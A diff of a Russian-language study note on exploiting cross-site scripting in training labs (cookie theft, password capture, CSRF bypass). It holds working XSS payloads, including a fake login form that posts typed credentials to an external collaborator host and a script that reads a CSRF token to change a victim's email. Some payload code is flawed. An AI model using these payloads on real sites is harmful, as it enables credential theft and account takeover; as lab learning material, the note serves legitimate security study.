@@ -1,4 +1,13 @@
-Традиционный способ показать что вы нашли XSS, это создать всплывающее окно с помощью alert(). это не потому что XSS как то связан с всплывающими окнами, просто это способ доказать что вы можете выполнить какой то произвольный JavasScript в заданном домене. Вы можете заметить, что некоторые используют `alert(document.domain)`. Это способ явно показать, в каком домене выполняется JavaScript
+[[#Эксплуатация Cross-Site Scripting для кражи Cookie]]
+	[[#Пример Lab Exploiting cross-site scripting to steal cookies]]
+[[#Эксплуатация Cross Site Scripting для перехвата паролей]]
+	[[#Пример Lab Exploiting cross-site scripting to capture passwords]]
+[[#Эксплуатация XSS для обхода защиты CSRF]]
+	[[#Пример Lab Exploiting XSS to bypass CSRF defenses]]
+
+----
+
+Tрадиционный способ показать что вы нашли XSS, это создать всплывающее окно с помощью alert(). это не потому что XSS как то связан с всплывающими окнами, просто это способ доказать что вы можете выполнить какой то произвольный JavasScript в заданном домене. Вы можете заметить, что некоторые используют `alert(document.domain)`. Это способ явно показать, в каком домене выполняется JavaScript
 
 Иногда вы захотите пойти дальше и доказать что XSS представляет реальную угрозу, предоставив полноценный эксплоит. В этом разделе мы рассмотрим три популярных способа эксплуатировать уязвимость XSS
 
@@ -31,17 +40,18 @@
 1 способ это same origin fetch когда мы просто запостим комментарий от лица пользователя с его логином и паролем примерный payload
 
 ```
-<input name=username id=username>
-<input type=password name=password onchange="fetch('/postID=1').then(r=>r.text()).then=>(html=>{
-var csfr =html.match(/name='csrf' value='([^`]+)'/)[1];
-fetch(/post/comment,{
-method:'POST',
-body:'csrf='+csrf+'&postId=5&comment='+username.value+':'+this.value+'&name=x&email=x@x.com&website=',
-headers:{'Content-Type':'application/x-www-form-urlencoded'}
-})
-})">
+<input name=username id=username><input type=password name=password onchange="if(this.value.length)fetch('/post?postId=1').then(r=>r.text()).then(html=>{var csrf=new DOMParser().parseFromString(html,'text/html').querySelector('[name=csrf]').value;fetch('/post/comment',{method:'POST',body:'csrf='+csrf+'&postId=1&comment='+username.value+':'+this.value+'&name=x&email=x@x.com&website=',headers:{'Content-Type':'application/x-www-form-urlencoded'}})})">
 ```
 
+с его помощью на странице товара 1 появится логин и пароль жертвы 
+
+2 способ заключается в отправке запроса на колаборатор с содержимым полей, примерный пейлоад
+
+```
+<input name=username id=username><input type=password name=password onchange="if(this.value.length)fetch('http://ywy2whmzwdg25a4qm693xlr80z6quhi6.oastify.com', {method:'POST',mode: 'no-cors',body:username.value+':'+this.value})">
+```
+
+После этого проверяем колаборатор там будет наш логин и пароль в теле запроса
 # Эксплуатация XSS для обхода защиты CSRF
 XSS позволяет атакующему делать практически все что может делать легитимный пользователь на сайте. Выполняя произвольный JavaScript в браузере жертвы, XSS позволяет выполнять широкий спектр действий как будто вы пользователь жертва. Например вы можете заставить жертву отправить сообщение принять запрос в друзья, залить бекдор в репозиторий исходного кода или перевести немного биткоинов
 
@@ -52,15 +62,12 @@ XSS позволяет атакующему делать практически 
 > [!warning] ВАЖНО!!!
 > CSRF токены неэффективны против XSS потому что XSS позволяет атакующему напрямую читать значения токенов и ответов
 
-```
-<img src=x onerror="fetch('my-account').then(r=>r.text()).then(html=>{
-var csfr =html.match(/name='csrf' value='([^']+)'/)[1];
-fetch('/post/comment',{
-method:'POST',
-body:'email=1234@mail.com&csrf='+csrf,
-headers:{'Content-Type':'application/x-www-form-urlencoded'}
-})">
+# Пример Lab: Exploiting XSS to bypass CSRF defenses
 
+Для решения необходимо поменять почту пользователя зашедшего на страницу, для этого используем пейлоад из предыдущей лабы только немного изменим его 
 
-<svg onload="fetch('/my-account').then(r=>r.text()).then(html=>{var doc=new DOMParser().parseFromString(html,'text/html');var csrf=doc.querySelector('[name=csrf]').value;fetch('/my-account/change-email',{method:'POST',body:'email=attacker@mail.com&csrf='+csrf,headers:{'Content-Type':'application/x-www-form-urlencoded'}})})">
 ```
+<svg onload="fetch('/my-account').then(r=>r.text()).then(html=>{var csrf=new DOMParser().parseFromString(html,'text/html').querySelector('[name=csrf]');fetch('/my-account/change-email',{method:'POST',body:'email=123@mail.com&csrf='+csrf,headers:{'Content-Type':'application/x-www-form-urlencoded'}})})">
+```
+
+После чего лабораторная засчитывается
